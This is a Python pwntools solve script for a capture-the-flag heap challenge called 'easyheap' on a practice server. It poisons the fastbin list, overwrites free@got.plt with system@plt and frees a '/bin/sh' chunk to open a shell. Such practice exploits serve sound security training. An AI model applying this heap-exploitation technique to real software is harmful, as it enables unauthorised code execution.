# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = 'easyheap'
islocal = 0
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 26809)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def create(size, content):
    p.sendlineafter("Your choice :", "1")
    p.sendlineafter("Size of Heap :", str(size))
    p.sendafter("Content of heap:", content)

def edit(idx, size, content):
    p.sendlineafter("Your choice :", "2")
    p.sendlineafter("Index :", str(idx))
    p.sendlineafter("Size of Heap :", str(size))
    p.sendafter("Content of heap :", content)

def delete(idx):
    p.sendlineafter("Your choice :", "3")
    p.sendlineafter("Index :", str(idx))

def exit():
    p.sendlineafter("Your choice :", "4")

def pwn():
    create(96, "chunk0")                # malloc chunk0    (size=0x60)
    # debug(0)
    create(96, "chunk1")                # malloc chunk1    (size=0x60)
    # debug(0)
    delete(1)                           # free chunk1
    # debug(0)

    payload1  = p64(0) * 12             # 0x60 * (0) for padding
    payload1 += p64(0)                  # fake prev_size (useless)
    payload1 += p64(0x71)               # fake size
    payload1 += p64(0x6020ad)           # fake fd
    payload1 += p64(0)                  # fake bk (useless)

    edit(0, 1000, payload1)             # prepare new_chunk1 to use, fastbins => (chunk1->0x6020ad->0x0)
    # debug(0)
    create(96, "new_chunk1")            # prepare to get pwn_chunk whose ptr => 0x6020ad
    # debug(0)
    create(96, "pwn_chunk")             # malloc pwn_chunk, we can write data in .bss
    # debug(0)
    
    payload2  = 'a' * 0x23
    payload2 += p64(0x602018)           # free@got.plt
    edit(2, 1000, payload2)             # chunk0_ptr => free@got.plt 
    # debug(0)

    edit(0, 1000, p64(0x400700))        # system@plt 往chunk0_ptr所指的地址(free@got.plt)中写入system@plt
    # debug(0)
    edit(1, 1000, "/bin/sh\x00")        # new_chunk1的content为"/bin/sh\x00"，因此free→content相当于system→"/bin/sh\x00"，由此得到shell
    # debug(0)
    delete(1)

    p.interactive()

if __name__ == '__main__':
    pwn()